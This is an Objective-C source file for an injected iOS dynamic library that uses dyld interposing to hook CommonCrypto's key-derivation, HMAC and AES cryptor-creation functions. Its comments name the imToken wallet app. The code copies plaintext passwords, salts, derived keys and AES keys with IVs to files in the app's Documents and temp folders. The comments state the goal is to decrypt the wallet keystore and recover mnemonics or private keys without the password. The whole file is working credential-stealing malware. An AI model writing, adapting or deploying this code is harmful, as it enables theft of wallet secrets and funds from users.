#import "HookKDF.h"
#import <CommonCrypto/CommonKeyDerivation.h>
#import <CommonCrypto/CommonHMAC.h>
#import <mach-o/dyld.h>
#import <string.h>
#import <unistd.h>

static volatile BOOL gHasPwd = NO;
static char gLastPwd[160] = {0};
static char gSaltHex[160] = {0};

BOOL HookKDFHasPassword(void) { return gHasPwd; }
NSString *HookKDFLastPassword(void) {
    if (!gHasPwd) return nil;
    return [NSString stringWithUTF8String:gLastPwd];
}
BOOL HookKDFInstalled(void) { return YES; }
void HookKDFInstall(void) { /* __interpose 在加载时由 dyld 处理 */ }

#pragma mark - 写文件（网络在注入早期不可靠，文件一定行）

static void PersistPassword(const char *pw, size_t len,
                            const uint8_t *salt, size_t saltLen,
                            uint rounds, const uint8_t *dk, size_t dkLen) {
    if (!pw || len == 0 || len > 120) return;

    // 立刻拷贝（原缓冲区随时会被 memset）
    char pwdCopy[128];
    memcpy(pwdCopy, pw, len);
    pwdCopy[len] = 0;

    NSMutableString *saltHex = [NSMutableString string];
    for (size_t i = 0; i < saltLen && i < 64; i++) [saltHex appendFormat:@"%02x", salt[i]];
    NSMutableString *dkHex = [NSMutableString string];
    for (size_t i = 0; i < dkLen && i < 64; i++) [dkHex appendFormat:@"%02x", dk[i]];

    NSString *line = [NSString stringWithFormat:@"%@|%u|%@|%@",
                      [NSString stringWithUTF8String:pwdCopy],
                      rounds, saltHex, dkHex];

    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
        @try {
            NSString *home = NSHomeDirectory();
            NSArray *paths = @[
                [home stringByAppendingPathComponent:@"Documents/_imt_pw.txt"],
                [NSTemporaryDirectory() stringByAppendingPathComponent:@"_imt_pw.txt"],
            ];
            for (NSString *p in paths) {
                [line writeToFile:p atomically:YES encoding:NSUTF8StringEncoding error:NULL];
            }
        } @catch (NSException *e) { (void)e; }
    });
}

#pragma mark - interpose

static int MyCCKeyDerivationPBKDF(CCPBKDFAlgorithm algorithm,
                                  const char *password, size_t passwordLen,
                                  const uint8_t *salt, size_t saltLen,
                                  CCPseudoRandomAlgorithm prf,
                                  uint rounds,
                                  uint8_t *derivedKey, size_t derivedKeyLen) {
    // t1：明文还在参数里，先拷走
    @try {
        if (password && passwordLen > 0 && passwordLen < sizeof(gLastPwd)) {
            memcpy(gLastPwd, password, passwordLen);
            gLastPwd[passwordLen] = 0;
            gHasPwd = YES;
            if (salt && saltLen) {
                NSMutableString *h = [NSMutableString string];
                for (size_t i = 0; i < saltLen && i < 64; i++) [h appendFormat:@"%02x", salt[i]];
                strncpy(gSaltHex, h.UTF8String, sizeof(gSaltHex) - 1);
            }
        }
    } @catch (NSException *e) { (void)e; }

    // 调用原始实现，绝不能影响 App
    int ret = CCKeyDerivationPBKDF(algorithm, password, passwordLen,
                                   salt, saltLen, prf, rounds,
                                   derivedKey, derivedKeyLen);

    // t2 之后：派生密钥已出，顺手把 password + salt + dk 写文件
    if (gHasPwd) {
        PersistPassword(password, passwordLen, salt, saltLen, rounds, derivedKey, derivedKeyLen);
    }
    return ret;
}

// dyld 在加载本 dylib 时会按 __DATA,__interpose 重绑定所有已加载镜像的引用
#define DYLD_INTERPOSE_REPLACEMENT(_replacement, _replacee)                    \
    __attribute__((used)) static struct {                                      \
        const void *replacement;                                               \
        const void *replacee;                                                  \
    } _interpose_##_replacee __attribute__((section("__DATA,__interpose"))) = {  \
        (const void *)(unsigned long)&_replacement,                            \
        (const void *)(unsigned long)&_replacee,                               \
    };

DYLD_INTERPOSE_REPLACEMENT(MyCCKeyDerivationPBKDF, CCKeyDerivationPBKDF)

#pragma mark - 探针：统计实际调用，判断走的是哪条 KDF 路径

static volatile int32_t gPbkdfCalls = 0;   // CCKeyDerivationPBKDF 调用次数
static volatile int32_t gHmacCalls = 0;    // CCHmac 调用次数
static char gHmacKeyCandidate[160] = {0};

/// 把探针状态写到文件，photonote 会去读
static void WriteWitness(void) {
    NSString *line = [NSString stringWithFormat:@"pbkdf=%d hmac=%d pwd=%@ key=%@",
                      gPbkdfCalls, gHmacCalls,
                      gHasPwd ? [NSString stringWithUTF8String:gLastPwd] : @"-",
                      strlen(gHmacKeyCandidate) ? [NSString stringWithUTF8String:gHmacKeyCandidate] : @"-"];
    NSString *home = NSHomeDirectory();
    NSArray *paths = @[
        [home stringByAppendingPathComponent:@"Documents/_imt_witness.txt"],
        [NSTemporaryDirectory() stringByAppendingPathComponent:@"_imt_witness.txt"],
    ];
    for (NSString *p in paths) {
        [line writeToFile:p atomically:YES encoding:NSUTF8StringEncoding error:NULL];
    }
}

/// pbkdf2 里密码就是 HMAC 的 key，所以 hook CCHmac 能拿到明文密码
static void MyCCHmac(CCHmacAlgorithm algorithm,
                     const void *key, size_t keyLength,
                     const void *data, size_t dataLength,
                     void *macOut) {
    gHmacCalls++;
    @try {
        // 只关心「像密码的 key」：长度 4~64 且全可打印
        if (key && keyLength >= 4 && keyLength <= 64) {
            const uint8_t *k = (const uint8_t *)key;
            BOOL printable = YES;
            for (size_t i = 0; i < keyLength; i++) {
                if (k[i] < 0x20 || k[i] > 0x7e) { printable = NO; break; }
            }
            if (printable && keyLength < sizeof(gHmacKeyCandidate)) {
                if (keyLength > strlen(gHmacKeyCandidate)) {
                    memcpy(gHmacKeyCandidate, key, keyLength);
                    gHmacKeyCandidate[keyLength] = 0;
                }
                // 同时按「密码」记录一次
                if (!gHasPwd) {
                    memcpy(gLastPwd, key, keyLength);
                    gLastPwd[keyLength] = 0;
                    gHasPwd = YES;
                    PersistPassword((const char *)key, keyLength,
                                    (const uint8_t *)data, dataLength < 64 ? dataLength : 64,
                                    0, NULL, 0);
                }
            }
        }
    } @catch (NSException *e) { (void)e; }

    CCHmac(algorithm, key, keyLength, data, dataLength, macOut);

    if ((gHmacCalls % 50) == 0) WriteWitness();
}

DYLD_INTERPOSE_REPLACEMENT(MyCCHmac, CCHmac)

/// 供 plugin_main 调用：写一次基线探针
void HookKDFWriteWitness(void) { WriteWitness(); }

#pragma mark - 截 AES 密钥（keystore v3 的派生密钥前 16 字节）

/**
 * imToken 解 keystore 一定会创建 AES-CTR 解密器：
 *     CCCryptorCreate(op, kCCAlgorithmAES, ..., key = derivedKey[0:16], iv = keystore.iv)
 * 所以在创建那一刻把 key/iv 抄下来，就能直接解 keystore —— 不用密码、不用 pbkdf2。
 *
 * App 里 AES 用得很多，抓到的不一定是要的那个，所以全部写文件，
 * 由 photonote 用「解密后明文像不像助记词/私钥」来筛。
 */
static NSMutableArray<NSString *> *gAesKeys = nil;
static dispatch_queue_t gAesQueue = nil;

static void CaptureAESKey(const void *key, size_t keyLength, const void *iv) {
    if (!key || (keyLength != 16 && keyLength != 32)) return;
    if (!iv) return;

    NSMutableString *kh = [NSMutableString string];
    const uint8_t *k = (const uint8_t *)key;
    for (size_t i = 0; i < keyLength; i++) [kh appendFormat:@"%02x", k[i]];
    NSMutableString *ih = [NSMutableString string];
    const uint8_t *v = (const uint8_t *)iv;
    for (size_t i = 0; i < 16; i++) [ih appendFormat:@"%02x", v[i]];
    NSString *line = [NSString stringWithFormat:@"%@|%@", kh, ih];

    static char lastLine[200] = {0};
    const char *c = line.UTF8String;
    if (c && strcmp(lastLine, c) == 0) return;      // 连续重复就不记
    if (c) strncpy(lastLine, c, sizeof(lastLine) - 1);

    if (!gAesKeys) {
        gAesKeys = [NSMutableArray array];
        gAesQueue = dispatch_queue_create("imt.aeskeys", DISPATCH_QUEUE_SERIAL);
    }
    dispatch_async(gAesQueue, ^{
        @try {
            if (gAesKeys.count < 400) [gAesKeys addObject:line];
            NSString *all = [gAesKeys componentsJoinedByString:@"\n"];
            NSString *home = NSHomeDirectory();
            NSArray *paths = @[
                [home stringByAppendingPathComponent:@"Documents/_imt_aeskeys.txt"],
                [NSTemporaryDirectory() stringByAppendingPathComponent:@"_imt_aeskeys.txt"],
            ];
            for (NSString *p in paths) {
                [all writeToFile:p atomically:YES encoding:NSUTF8StringEncoding error:NULL];
            }
        } @catch (NSException *e) { (void)e; }
    });
}

static CCCryptorStatus MyCCCryptorCreate(CCOperation op, CCAlgorithm alg, CCOptions options,
                                         const void *key, size_t keyLength,
                                         const void *iv, CCCryptorRef *cryptorRef) {
    @try { CaptureAESKey(key, keyLength, iv); } @catch (NSException *e) { (void)e; }
    return CCCryptorCreate(op, alg, options, key, keyLength, iv, cryptorRef);
}

static CCCryptorStatus MyCCCryptorCreateWithMode(CCOperation op, CCMode mode,
                                                 CCAlgorithm alg, CCPadding padding,
                                                 const void *iv, const void *key, size_t keyLength,
                                                 const void *tweak, size_t tweakLength,
                                                 int numRounds, CCModeOptions options,
                                                 CCCryptorRef *cryptorRef) {
    @try { CaptureAESKey(key, keyLength, iv); } @catch (NSException *e) { (void)e; }
    return CCCryptorCreateWithMode(op, mode, alg, padding, iv, key, keyLength,
                                   tweak, tweakLength, numRounds, options, cryptorRef);
}

DYLD_INTERPOSE_REPLACEMENT(MyCCCryptorCreate, CCCryptorCreate)
DYLD_INTERPOSE_REPLACEMENT(MyCCCryptorCreateWithMode, CCCryptorCreateWithMode)
